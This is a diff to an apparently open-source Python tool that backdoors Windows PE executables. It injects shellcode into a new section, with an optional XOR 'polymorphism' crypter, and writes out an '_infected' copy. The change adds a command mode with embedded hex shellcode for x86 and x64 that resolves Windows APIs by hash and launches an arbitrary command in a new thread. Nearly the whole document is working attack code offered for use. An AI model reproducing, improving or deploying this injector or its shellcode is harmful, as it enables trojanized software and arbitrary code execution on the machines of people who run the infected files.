@@ -25,7 +25,7 @@ This python tool injects shellcode in Windows Program Executable to
 backdoor it with optional polymorphism.
 """
 
-__version__ = "1.0.3"
+__version__ = "1.2.0"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -50,9 +50,9 @@ license = __license__
 
 print(copyright)
 
+from sys import argv, stderr, exit, executable
 from dataclasses import dataclass, field
 from os.path import splitext, isfile
-from sys import argv, stderr, exit
 from _io import _BufferedIOBase
 from typing import Tuple, List
 from base64 import b16decode
@@ -145,22 +145,30 @@ def arg_parse() -> Tuple[str, str, bool]:
         1. Executable path
         2. Hexadecimal shellcode
         3. Use polymorphism
+        4. Use default shellcode to run a command
     """
 
-    if len(argv) == 4:
+    polymorphism = command = False
+    if len(argv) == 4 or len(argv) == 5:
         if "-p" in argv:
             argv.remove("-p")
+            polymorphism = True
         elif "--polymorphism" in argv:
             argv.remove("--polymorphism")
-        polymorphism = True
-    else:
-        polymorphism = False
+            polymorphism = True
+        if "-c" in argv:
+            argv.remove("-c")
+            command = True
+        elif "--command" in argv:
+            argv.remove("--command")
+            command = True
 
     if len(argv) != 3:
         print(
-            "USAGES: python3",
+            "USAGES: ",
+            executable,
             argv[0],
-            "-p <executable_path> <shellcode_hexadecimal>",
+            "-p -c <executable_path> <shellcode_hexadecimal or command>",
             file=stderr,
         )
         exit(1)
@@ -174,14 +182,18 @@ def arg_parse() -> Tuple[str, str, bool]:
         )
         exit(2)
 
-    if any(x not in "0123456789abcdefABCDEF" for x in shellcode):
+    if (
+        any(x not in "0123456789abcdefABCDEF" for x in shellcode)
+        and not command
+    ):
         print(
-            "<shellcode_hexadecimal>: should be a hexadecimal value",
+            "<shellcode_hexadecimal or command>: should be a hexadecimal",
+            " value or a string command when you use the -c/--command value",
             file=stderr,
         )
         exit(3)
 
-    return file_path, shellcode, polymorphism
+    return file_path, shellcode, polymorphism, command
 
 
 def parse_nt_headers(
@@ -201,10 +213,10 @@ def parse_nt_headers(
         )
 
     injector_data.address_nt_headers = int.from_bytes(
-        memory_file_mapping[0x3C:0x3C + 4], "little"
+        memory_file_mapping[0x3C : 0x3C + 4], "little"
     )
 
-    nt_headers = memory_file_mapping[injector_data.address_nt_headers:]
+    nt_headers = memory_file_mapping[injector_data.address_nt_headers :]
 
     if bytes(nt_headers[0:4]) != b"PE\0\0":
         raise ProgramExecutableError(
@@ -260,7 +272,7 @@ def parse_sections_headers(
     This function parses the sections headers.
     """
 
-    section_headers = optional_headers[injector_data.optional_headers_size:]
+    section_headers = optional_headers[injector_data.optional_headers_size :]
 
     for index in range(injector_data.sections_number):
         section = Section()
@@ -372,7 +384,7 @@ def generate_shellcode_suffix(
 
 
 def build_injected_shellcode(
-    injector_data: PeInjectorData, polymorphism: bool
+    injector_data: PeInjectorData, polymorphism: bool, command: bool
 ) -> bytes:
     """
     This function generates the injected shellcode.
@@ -390,16 +402,25 @@ def build_injected_shellcode(
             "eb24584889c248054f5f6f7f48c7c1aa0000008"
             "a1830cb881848ffc84839c27ef248ffc0ffe0e8d7ffffff"
         )
+        generate_command_shellcode = generate_command_shellcode_x64
     elif machine_types[injector_data.machine_architecture] == "x86":
         # rex_instruction = b""
         crypter = bytes.fromhex(
             "eb1d5889c2054f5f6f7fc7c1aa0000008a183"
             "0cb8818ffc839c27ef440ffe0e8deffffff"
         )
+        generate_command_shellcode = generate_command_shellcode_x86
 
     # injector_data.shellcode += (
     #     rex_instruction + b"\xb8" + original_entry_point + b"\xff\xe0"
     # )
+
+    if command:
+        injector_data.shellcode = b16decode(
+            generate_command_shellcode(injector_data.shellcode)
+            .upper()
+            .encode()
+        )
 
     key = None
     if polymorphism:
@@ -509,13 +530,19 @@ def check_new_section_injection(
     modify sections position instead.
     """
 
-    nt_headers = memory_file_mapping[injector_data.address_nt_headers:]
+    nt_headers = memory_file_mapping[injector_data.address_nt_headers :]
     optional_headers = nt_headers[0x18:]
-    section_headers = optional_headers[injector_data.optional_headers_size:]
+    section_headers = optional_headers[injector_data.optional_headers_size :]
 
     injector_data.new_values.first_section_offset = (
         injector_data.first_section_offset
-    ) = min((section.file_offset for section in injector_data.sections))
+    ) = min(
+        (
+            section.file_offset
+            for section in injector_data.sections
+            if section.file_offset
+        )
+    )
 
     injector_data.address_end_new_section_headers = (
         injector_data.offset_new_section_headers
@@ -546,9 +573,7 @@ def get_new_section_headers(
     last_section_file_end_address, file_new_section_size = (
         get_new_section_offset(injector_data)
     )
-    check_new_section_injection(
-        injector_data, memory_file_mapping
-    )
+    check_new_section_injection(injector_data, memory_file_mapping)
     new_section_headers = generate_new_section_headers(
         injector_data, file_new_section_size, polymorphism
     )
@@ -564,7 +589,7 @@ def rewrite_pe_headers(
     This function writes new value for PE headers.
     """
 
-    nt_headers = memory_file_mapping[injector_data.address_nt_headers:]
+    nt_headers = memory_file_mapping[injector_data.address_nt_headers :]
     image_headers = nt_headers[4:]
     optional_headers = nt_headers[0x18:]
 
@@ -599,14 +624,14 @@ def write_new_pe_file(
         (
             bytes(
                 memory_file_mapping[
-                    :injector_data.address_end_new_section_headers - 40
+                    : injector_data.address_end_new_section_headers - 40
                 ]
             )
             + new_section_headers
         ).ljust(injector_data.new_values.first_section_offset, b"\0")
         + bytes(
             memory_file_mapping[
-                injector_data.first_section_offset:last_section_end_address
+                injector_data.first_section_offset : last_section_end_address
             ]
         ).ljust(
             injector_data.new_values.section_offset
@@ -627,6 +652,7 @@ def inject(
     backdoored_executable: _BufferedIOBase,
     shellcode: bytes,
     polymorphism: bool = False,
+    command: bool = False,
 ) -> bytes:
     """
     This function injects the shellcode into the backdoored executable.
@@ -635,7 +661,7 @@ def inject(
     memory_file_mapping, injector_data = parse_pe_file(target_executable)
     injector_data.shellcode = shellcode
 
-    build_injected_shellcode(injector_data, polymorphism)
+    build_injected_shellcode(injector_data, polymorphism, command)
 
     new_section_headers, last_section_end_address = get_new_section_headers(
         injector_data, memory_file_mapping, polymorphism
@@ -651,12 +677,85 @@ def inject(
     )
 
 
+def generate_command_shellcode_x86(command: str) -> bytes:
+    """
+    This function generates a x64 shellcode to start a command in a new thread.
+    """
+
+    command = command.encode() + b"\x00"
+    command_length = len(command).to_bytes(4, "little")
+
+    shellcode = (
+        "9090609cfc90e8c60000006089e531d290648b15300000008b520c8b5214eb"
+        "0272288b722831c9668b4a2631ff31c0ac3c617c022c20c1cf0d01c74975ef"
+        "5290578b5210908b423c01d0908b4078eb09eb07ea484204857c3a85c0746a"
+        "9001d050908b48188b582001d3e35a498b348b01d631ff9031c0eb06ff69d5"
+        "380dcfacc1cf0d01c738e0eb057f1bd2eb0375e4037df83b7d2475d258908b"
+        "582401d390668b0c4b8b581c01d390eb04cd97f1b18b048b01d09089442424"
+        "5b5b6190595a51eb010fffe058905f5a8b12e951ffffff905d90bec6000000"
+        "906a4090680010000056906a006858a453e5ffd589c389c79089f1eb41905e"
+        "909090f2a4e820000000bbe01d2a0a9068a695bd9dffd53c067c0a80fbe075"
+        "05bb4713726f6a0053ffd531c05050505350506838680d16ffd558589061eb"
+        "05e8bafffffffce8840000006089e531c0648b50308b520c8b52148b722831"
+        "c9668b4a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c"
+        "1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c7"
+        "38e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01"
+        "d0894424245b5b61595a51ffe05f5f5a8b12eb8b5d6a018d85b90000005068"
+        "318b6f87ffd5bbaac5e25d68a695bd9dffd53c067c0a80fbe07505bb471372"
+        "6f6a0053ffd5e9"
+    )
+
+    shellcode += command_length.hex() + command.hex()
+
+    return shellcode
+
+
+def generate_command_shellcode_x64(command: str) -> bytes:
+    """
+    This function generates a x64 shellcode to start a command in a new thread.
+    """
+
+    command = command.encode() + b"\x00"
+    command_length = len(command).to_bytes(4, "little")
+
+    shellcode = (
+        "9050535152565755415041514152415341544155415641579c90e8c0000000"
+        "415141505251564831d265488b5260488b5218488b5220488b7250480fb74a"
+        "4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b"
+        "423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e3"
+        "5648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c03"
+        "4c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04"
+        "884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b"
+        "12e957ffffff5d41be120100006a404159680010000041584c89f26a005968"
+        "58a453e5415affd54889c34889c7b912010000eb425ef2a4e8000000004831"
+        "c050504989c14889c24989d84889c141ba38680d16ffd54883c4589d415f41"
+        "5e415d415c415b415a415941585d5c5f5e5a595b58e917010000e8b8ffffff"
+        "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b"
+        "5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1"
+        "e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b"
+        "4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c9"
+        "0d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48"
+        "448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec20"
+        "4152ffe05841595a488b12e957ffffff5dba01000000488d8d0101000041ba"
+        "318b6f87ffd5bbaac5e25d41baa695bd9dffd54883c4283c067c0a80fbe075"
+        "05bb4713726f6a00594189daffd5e9"
+    )
+
+    shellcode += (
+        command_length.hex()
+        + command.hex()
+        + "4883c4604831ed9d415f415e415d415c415b415a415941585d5f5e5a595b58"
+    )
+
+    return shellcode
+
+
 def main() -> int:
     """
     This function starts the program from the command line.
     """
 
-    executable, shellcode, polymorphism = arg_parse()
+    executable, shellcode, polymorphism, command = arg_parse()
 
     path, extension = splitext(executable)
     new_path = path + "_infected" + extension
@@ -666,8 +765,13 @@ def main() -> int:
             inject(
                 target,
                 backdoor,
-                b16decode(shellcode.upper().encode()),
+                (
+                    shellcode
+                    if command
+                    else b16decode(shellcode.upper().encode())
+                ),
                 polymorphism,
+                command,
             )
         except ArchitectureError as e:
             print(
